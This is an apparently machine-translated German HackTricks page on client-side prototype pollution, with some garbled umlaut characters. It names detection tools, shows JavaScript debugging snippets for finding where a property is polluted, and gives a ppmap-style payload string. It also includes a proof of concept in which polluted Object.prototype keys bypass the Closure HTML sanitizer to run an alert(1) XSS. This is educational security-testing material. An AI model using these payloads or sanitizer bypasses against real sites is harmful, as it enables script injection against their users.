# Client-seitige Prototyp-Verschmutzung

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) **bei oder folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

## Entdeckung mit automatischen Tools

Die Tools [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **und** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) k√∂nnen verwendet werden, um **Prototyp-Verschmutzungs-Schwachstellen** zu finden.

Dar√ºber hinaus k√∂nnen Sie auch die **Browser-Erweiterung** [**PPScan**](https://github.com/msrkp/PPScan) verwenden, um automatisch die von Ihnen aufgerufenen **Seiten** auf Prototyp-Verschmutzungs-Schwachstellen zu **scannen**.

### Debuggen, wo eine Eigenschaft verwendet wird <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Ermitteln der Ursache f√ºr Prototype Pollution <a href="#5530" id="5530"></a>

Sobald eine Prototype Pollution-Schwachstelle von einem der Tools identifiziert wurde und der Code nicht √ºberm√§√üig komplex ist, k√∂nnen Sie die Schwachstelle finden, indem Sie nach Schl√ºsselw√∂rtern wie `location.hash`, `decodeURIComponent` oder `location.search` in den Chrome Developer Tools suchen. Mit diesem Ansatz k√∂nnen Sie den verwundbaren Abschnitt des JavaScript-Codes genau lokalisieren.

Bei gr√∂√üeren und komplexeren Codebasen k√∂nnen Sie die verwundbare Codezeile mit folgenden Schritten ermitteln:

1. Verwenden Sie ein Tool, um eine Schwachstelle zu identifizieren und eine Payload zu erhalten, die dazu dient, eine Eigenschaft im Konstruktor zu setzen. Ein von ppmap bereitgestelltes Beispiel k√∂nnte wie folgt aussehen: `constructor[prototype][ppmap]=reserved`.
2. Setzen Sie einen Breakpoint in der ersten Zeile des JavaScript-Codes, der auf der Seite ausgef√ºhrt wird. Aktualisieren Sie die Seite mit der Payload und pausieren Sie die Ausf√ºhrung an diesem Breakpoint.
3. W√§hrend die JavaScript-Ausf√ºhrung pausiert ist, f√ºhren Sie das folgende Skript in der JS-Konsole aus. Dieses Skript signalisiert, wenn die Eigenschaft 'ppmap' erstellt wird und hilft bei der Lokalisierung ihrer Herkunft:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. Navigieren Sie zur√ºck zum **Quellen**-Tab und w√§hlen Sie "Skriptausf√ºhrung fortsetzen" aus. Das JavaScript wird weiterhin ausgef√ºhrt und die 'ppmap'-Eigenschaft wird wie erwartet verunreinigt. Durch die Verwendung des bereitgestellten Codes kann der genaue Ort identifiziert werden, an dem die 'ppmap'-Eigenschaft verunreinigt wird. Durch Untersuchung des **Aufrufstapels** k√∂nnen verschiedene Stapel, in denen die Verunreinigung auftritt, beobachtet werden.

Bei der Entscheidung, welchen Stapel untersucht werden soll, ist es oft n√ºtzlich, Stapel zu w√§hlen, die mit JavaScript-Bibliotheksdateien verbunden sind, da die Prototyp-Verunreinigung h√§ufig in diesen Bibliotheken auftritt. Identifizieren Sie den relevanten Stapel, indem Sie seine Verbindung zu Bibliotheksdateien untersuchen (sichtbar auf der rechten Seite, √§hnlich wie auf einem Bild, das als Anleitung bereitgestellt wird). In Szenarien mit mehreren Stapeln, wie z.B. auf den Zeilen 4 und 6, ist die logische Wahl der Stapel auf Zeile 4, da er das erste Auftreten der Verunreinigung und damit die Ursache der Schwachstelle darstellt. Durch Klicken auf den Stapel gelangen Sie zum verwundbaren Code.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Suche nach Skript-Gadgets

Das Gadget ist der **Code, der missbraucht wird, sobald eine PP-Schwachstelle entdeckt wird**.

Wenn die Anwendung einfach ist, k√∂nnen wir nach **Schl√ºsselw√∂rtern** wie **`srcdoc/innerHTML/iframe/createElement`** suchen und den Quellcode √ºberpr√ºfen, um festzustellen, ob er zu einer **Ausf√ºhrung von JavaScript** f√ºhrt. Manchmal k√∂nnen die genannten Techniken √ºberhaupt keine Gadgets finden. In diesem Fall zeigt eine reine √úberpr√ºfung des Quellcodes einige interessante Gadgets wie im folgenden Beispiel.

### Beispiel zum Auffinden von PP-Gadgets im Mithil-Bibliothekscode

Lesen Sie diesen Artikel: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Neukompilierung von Payloads f√ºr verwundbare Bibliotheken

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Umgehung von HTML-Sanitizern √ºber PP

[**Diese Forschung**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) zeigt PP-Gadgets, die verwendet werden k√∂nnen, um die von einigen HTML-Sanitizern bereitgestellten **S√§uberungen zu umgehen**:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* #### Closure
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Referenzen

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
